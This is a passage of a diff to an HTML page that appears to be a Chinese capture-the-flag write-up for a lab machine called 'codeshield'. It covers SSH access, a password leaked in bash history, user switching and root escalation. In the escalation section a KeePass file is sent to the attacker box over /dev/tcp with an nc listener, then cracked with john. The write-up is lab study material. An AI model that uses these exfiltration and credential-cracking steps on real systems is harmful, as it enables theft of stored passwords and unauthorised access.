-<span class="pl-s"> | | If you<span class="pl-pds">'</span></span>re unauthorized, terminate access now<span class="pl-k">!</span>                                                     <span class="pl-k">|</span> <span class="pl-k">|</span> 
- <span class="pl-k">|</span> <span class="pl-k">|</span>                                                                                                   <span class="pl-k">|</span> <span class="pl-k">|</span>
- <span class="pl-k">|</span> <span class="pl-k">|</span>                                                                                                   <span class="pl-k">|</span> <span class="pl-k">|</span>
- <span class="pl-k">|</span> <span class="pl-k">|</span>___________________________________________________________________________________________________<span class="pl-k">|</span> <span class="pl-k">|</span>
- <span class="pl-k">|</span>_______________________________________________________________________________________________________<span class="pl-k">|</span>
-mitchellt@192.168.205.138<span class="pl-s"><span class="pl-pds">'</span>s password: </span>
-<span class="pl-s">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-79-generic x86_64)</span>
-<span class="pl-s"></span>
-<span class="pl-s"> * Documentation:  https://help.ubuntu.com</span>
-<span class="pl-s"> * Management:     https://landscape.canonical.com</span>
-<span class="pl-s"> * Support:        https://ubuntu.com/advantage</span>
-<span class="pl-s"></span>
-<span class="pl-s">  System information as of Mon Jan 20 07:15:11 AM UTC 2025</span>
-<span class="pl-s"></span>
-<span class="pl-s">  System load:  0.640625           Processes:               240</span>
-<span class="pl-s">  Usage of /:   29.1% of 47.93GB   Users logged in:         0</span>
-<span class="pl-s">  Memory usage: 59%                IPv4 address for enp0s3: 192.168.205.138</span>
-<span class="pl-s">  Swap usage:   0%</span>
-<span class="pl-s"></span>
-<span class="pl-s"> * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s</span>
-<span class="pl-s">   just raised the bar for easy, resilient and secure K8s cluster deployment.</span>
-<span class="pl-s"></span>
-<span class="pl-s">   https://ubuntu.com/engage/secure-kubernetes-at-the-edge</span>
-<span class="pl-s"></span>
-<span class="pl-s">Expanded Security Maintenance for Applications is not enabled.</span>
-<span class="pl-s"></span>
-<span class="pl-s">10 updates can be applied immediately.</span>
-<span class="pl-s">To see these additional updates run: apt list --upgradable</span>
-<span class="pl-s"></span>
-<span class="pl-s">Enable ESM Apps to receive additional future security updates.</span>
-<span class="pl-s">See https://ubuntu.com/esm or run: sudo pro status</span>
-<span class="pl-s"></span>
-<span class="pl-s"></span>
-<span class="pl-s">The list of available updates is more than a week old.</span>
-<span class="pl-s">To check for new updates run: sudo apt update</span>
-<span class="pl-s">New release <span class="pl-pds">'</span></span>24.04.1 LTS<span class="pl-s"><span class="pl-pds">'</span> available.</span>
-<span class="pl-s">Run <span class="pl-pds">'</span></span>do-release-upgrade<span class="pl-s"><span class="pl-pds">'</span> to upgrade to it.</span>
-<span class="pl-s"></span>
-<span class="pl-s"></span>
-<span class="pl-s">mitchellt@codeshield:~$ id</span>
-<span class="pl-s">uid=1006(mitchellt) gid=1006(mitchellt) groups=1006(mitchellt)</span>
-<span class="pl-s"></span></pre></div>
+The authenticity of host '[192.168.205.138]:22222 ([192.168.205.138]:22222)' can't be established.
+ED25519 key fingerprint is SHA256:Y+iV2eHvzSBp6ZbF+2VqTJdZ5+XyH5tVaxNCzS7tp3I.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.205.138]:22222' (ED25519) to the list of known hosts.
+             @@@                          
+      @@@@@@@@@  @@@@@@                   
+ @@@@@@@@@@@@@@          (@@              
+ @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗                                 
+ @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗           
+  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║           
+  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║           
+    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝           
+     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝            
+        @@@@@@@   @@@                     
+           @@@@@@@                                                         
+
+  _______________________________________________________________________________________________________
+ |  _WARNING: This system is restricted to authorized users!___________________________________________  |
+ | |                                                                                                   | |
+ | | IT IS AN OFFENSE TO CONTINUE WITHOUT PROPER AUTHORIZATION.                                        | |
+ | |                                                                                                   | |
+ | | This system is restricted to authorized users.                                                    | | 
+ | | Individuals who attempt unauthorized access will be prosecuted.                                   | | 
+ | | If you're unauthorized, terminate access now!                                                     | | 
+ | |                                                                                                   | |
+ | |                                                                                                   | |
+ | |___________________________________________________________________________________________________| |
+ |_______________________________________________________________________________________________________|
+mitchellt@192.168.205.138's password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-79-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Jan 20 07:15:11 AM UTC 2025
+
+  System load:  0.640625           Processes:               240
+  Usage of /:   29.1% of 47.93GB   Users logged in:         0
+  Memory usage: 59%                IPv4 address for enp0s3: 192.168.205.138
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+10 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+New release '24.04.1 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+mitchellt@codeshield:~$ id
+uid=1006(mitchellt) gid=1006(mitchellt) groups=1006(mitchellt)
+
+</code></pre>
 <h1>3.提权</h1>
-<div class="highlight highlight-source-shell"><pre class="notranslate">mitchellt@codeshield:<span class="pl-k">~</span>$ ls -la
+<pre lang="bash" class="notranslate"><code class="notranslate">mitchellt@codeshield:~$ ls -la
 total 112
-drwxr-x--- 17 mitchellt mitchellt 4096 Aug 30  2023 <span class="pl-c1">.</span>
+drwxr-x--- 17 mitchellt mitchellt 4096 Aug 30  2023 .
 drwxr-xr-x 14 root      root      4096 Aug 26  2023 ..
 -rw-------  1 mitchellt mitchellt  209 Aug 30  2023 .bash_history
 -rw-r--r--  1 mitchellt mitchellt  220 Aug 26  2023 .bash_logout
@@ -693,22 +704,22 @@ drwx------  6 mitchellt mitchellt 4096 Aug 28  2023 .thunderbird
 -rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-seamless-tty2-control.pid
 -rw-r-----  1 mitchellt mitchellt    6 Aug 30  2023 .vboxclient-vmsvga-session-tty2-control.pid
 drwxr-xr-x  2 mitchellt mitchellt 4096 Aug 28  2023 Videos
-mitchellt@codeshield:<span class="pl-k">~</span>$ cat .bash_history
-<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>EARL!YP7DeVel@OP<span class="pl-pds">'</span></span><span class="pl-k">|</span> su - earlyp -c <span class="pl-s"><span class="pl-pds">"</span>cp -r /home/earlyp/Development/mining .<span class="pl-pds">"</span></span>
-<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>EARL!YP7DeVel@OP<span class="pl-pds">'</span></span><span class="pl-k">|</span> su - earlyp -c <span class="pl-s"><span class="pl-pds">"</span>cp -r /home/earlyp/Development/mining /tmp<span class="pl-pds">"</span></span>
-cp -r /tmp/mining <span class="pl-c1">.</span>
+mitchellt@codeshield:~$ cat .bash_history
+echo 'EARL!YP7DeVel@OP'| su - earlyp -c "cp -r /home/earlyp/Development/mining ."
+echo 'EARL!YP7DeVel@OP'| su - earlyp -c "cp -r /home/earlyp/Development/mining /tmp"
+cp -r /tmp/mining .
 ls
-<span class="pl-c1">cd</span> mining/
+cd mining/
 ls
-<span class="pl-c1">exit</span>
-mitchellt@codeshield:<span class="pl-k">~</span>$ su - earlyp
+exit
+mitchellt@codeshield:~$ su - earlyp
 Password: 
-earlyp@codeshield:<span class="pl-k">~</span>$ sudo -l
-[sudo] password <span class="pl-k">for</span> earlyp: 
+earlyp@codeshield:~$ sudo -l
+[sudo] password for earlyp: 
 Sorry, user earlyp may not run sudo on mail.
-earlyp@codeshield:<span class="pl-k">~</span>$ ls -la
+earlyp@codeshield:~$ ls -la
 total 116
-drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 <span class="pl-c1">.</span>
+drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 .
 drwxr-xr-x 14 root   root   4096 Aug 26  2023 ..
 -rw-------  1 earlyp earlyp   36 Aug 29  2023 .bash_history
 -rw-r--r--  1 earlyp earlyp  220 Jan  6  2022 .bash_logout
@@ -738,23 +749,23 @@ drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Templates
 -rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-seamless-tty2-control.pid
 -rw-r-----  1 earlyp earlyp    6 Aug 28  2023 .vboxclient-vmsvga-session-tty2-control.pid
 drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 Videos
-earlyp@codeshield:<span class="pl-k">~</span>$ cat .bash_history
-<span class="pl-c1">cd</span> <span class="pl-k">~</span>
+earlyp@codeshield:~$ cat .bash_history
+cd ~
 ls
-<span class="pl-c1">cd</span> Development/
+cd Development/
 ls
-<span class="pl-c1">pwd</span>
-<span class="pl-c1">exit</span>
-earlyp@codeshield:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span> Development
-earlyp@codeshield:<span class="pl-k">~</span>/Development$ ls -la
+pwd
+exit
+earlyp@codeshield:~$ cd Development
+earlyp@codeshield:~/Development$ ls -la
 total 12
-drwxrwxr-x  3 earlyp earlyp 4096 Aug 28  2023 <span class="pl-c1">.</span>
+drwxrwxr-x  3 earlyp earlyp 4096 Aug 28  2023 .
 drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 ..
 drwxrwxr-x  6 earlyp earlyp 4096 Aug 28  2023 mining
-earlyp@codeshield:<span class="pl-k">~</span>/Development$ <span class="pl-c1">cd</span> mining/
-earlyp@codeshield:<span class="pl-k">~</span>/Development/mining$ ls -al
+earlyp@codeshield:~/Development$ cd mining/
+earlyp@codeshield:~/Development/mining$ ls -al
 total 92
-drwxrwxr-x 6 earlyp earlyp 4096 Aug 28  2023 <span class="pl-c1">.</span>
+drwxrwxr-x 6 earlyp earlyp 4096 Aug 28  2023 .
 drwxrwxr-x 3 earlyp earlyp 4096 Aug 28  2023 ..
 -rw-rw-r-- 1 earlyp earlyp  298 Aug 28  2023 circle.yml
 -rw-rw-r-- 1 earlyp earlyp  358 Aug 28  2023 CONTRIBUTING.rst
@@ -778,51 +789,54 @@ drwxrwxr-x 2 earlyp earlyp 4096 Aug 28  2023 scripts
 -rw-rw-r-- 1 earlyp earlyp 2366 Aug 28  2023 setup.py
 -rw-rw-r-- 1 earlyp earlyp  312 Aug 28  2023 .travis.yml
 
-earlyp@codeshield:<span class="pl-k">~</span>/Development/mining$ <span class="pl-c1">cd</span> <span class="pl-k">~</span>
-earlyp@codeshield:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span> Desktop/
-earlyp@codeshield:<span class="pl-k">~</span>/Desktop$ ls -al
+earlyp@codeshield:~/Development/mining$ cd ~
+earlyp@codeshield:~$ cd Desktop/
+earlyp@codeshield:~/Desktop$ ls -al
 total 8
-drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 <span class="pl-c1">.</span>
+drwxr-xr-x  2 earlyp earlyp 4096 Aug 22  2023 .
 drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 ..
-earlyp@codeshield:<span class="pl-k">~</span>/Desktop$ <span class="pl-c1">cd</span> <span class="pl-k">~</span>/Documents/
-earlyp@codeshield:<span class="pl-k">~</span>/Documents$ ls -al
+earlyp@codeshield:~/Desktop$ cd ~/Documents/
+earlyp@codeshield:~/Documents$ ls -al
 total 12
-drwxr-xr-x  2 earlyp earlyp 4096 Aug 28  2023 <span class="pl-c1">.</span>
+drwxr-xr-x  2 earlyp earlyp 4096 Aug 28  2023 .
 drwxr-x--- 19 earlyp earlyp 4096 Aug 29  2023 ..
--rw-------  1 earlyp earlyp 1918 Aug 28  2023 Passwords.kdbx</pre></div>
+-rw-------  1 earlyp earlyp 1918 Aug 28  2023 Passwords.kdbx
+</code></pre>
 <p>拷过去破解一下</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">earlyp@codeshield:<span class="pl-k">~</span>/Documents$ cat Passwords.kdbx <span class="pl-k">&gt;</span> /dev/tcp/192.168.205.141/7777
+<pre lang="bash" class="notranslate"><code class="notranslate">earlyp@codeshield:~/Documents$ cat Passwords.kdbx &gt; /dev/tcp/192.168.205.141/7777
 
-<span class="pl-c"><span class="pl-c">#</span>kali</span>
+#kali
 ┌──(kali㉿kali)-[~/test]
-└─$ nc -lvnp 7777 <span class="pl-k">&gt;</span> Passwords.kdbx               
+└─$ nc -lvnp 7777 &gt; Passwords.kdbx               
 listening on [any] 7777 ...
 connect to [192.168.205.141] from (UNKNOWN) [192.168.205.138] 53802
                                                                                                                                      
 ┌──(kali㉿kali)-[~/test]
-└─$ keepass2john Passwords.kdbx <span class="pl-k">&gt;</span> <span class="pl-c1">hash</span>
+└─$ keepass2john Passwords.kdbx &gt; hash
                                                    
 ┌──(kali㉿kali)-[~/test]
-└─$ john --wordlist=/usr/share/wordlists/rockyou.txt <span class="pl-c1">hash</span> 
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
 Using default input encoding: UTF-8
-Loaded 1 password <span class="pl-c1">hash</span> (KeePass [SHA256 AES 32/64])
-Cost 1 (iteration count) is 3225806 <span class="pl-k">for</span> all loaded hashes
-Cost 2 (version) is 2 <span class="pl-k">for</span> all loaded hashes
-Cost 3 (algorithm [0<span class="pl-k">=</span>AES 1<span class="pl-k">=</span>TwoFish 2<span class="pl-k">=</span>ChaCha]) is 0 <span class="pl-k">for</span> all loaded hashes
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 3225806 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
 Will run 12 OpenMP threads
-Press <span class="pl-s"><span class="pl-pds">'</span>q<span class="pl-pds">'</span></span> or Ctrl-C to abort, almost any other key <span class="pl-k">for</span> status
+Press 'q' or Ctrl-C to abort, almost any other key for status
 0g 0:00:04:14 0.01% (ETA: 2025-02-13 23:25) 0g/s 8.313p/s 8.313c/s 8.313C/s laurita..myfamily
 0g 0:00:05:31 0.02% (ETA: 2025-02-14 05:03) 0g/s 8.264p/s 8.264c/s 8.264C/s onlyme..victoria1
 0g 0:00:08:56 0.03% (ETA: 2025-02-14 05:14) 0g/s 8.228p/s 8.228c/s 8.228C/s priscila..a1b2c3d4
-Session aborted</pre></div>
+Session aborted
+</code></pre>
 <p>爆破了八分钟还没出来，实在等不下去了，我直接去其他大佬那里偷了个密码<code class="notranslate">mandalorian</code>，撕.....这个密码在868083行，最小的都在20451行</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/53d42048-f033-408e-b311-b7ae95f72946"><img src="https://github.com/user-attachments/assets/53d42048-f033-408e-b311-b7ae95f72946" alt="Image" style="max-width: 100%;"></a></p>
 <p>快速的切回去换root（不然你要重新双击，它复制有时间限制）</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">earlyp@codeshield:<span class="pl-k">~</span>/Documents$ su -
+<pre lang="bash" class="notranslate"><code class="notranslate">earlyp@codeshield:~/Documents$ su -
 Password: 
-root@codeshield:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> id</span>
+root@codeshield:~# id
 uid=0(root) gid=0(root) groups=0(root)
-</pre></div>
+
+</code></pre>
 <h1>4.后话</h1>
 <p>去看<strong>ll104567</strong>大佬的wp发现，那个用户不用这么麻烦获取，你直接看他虚拟机图形化界面的登录就好了，那里全有，而且<strong>valdezk ftp</strong>那里，作者是让我们登录那个<strong>web mail</strong>查看的，不是直接看源码......</p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
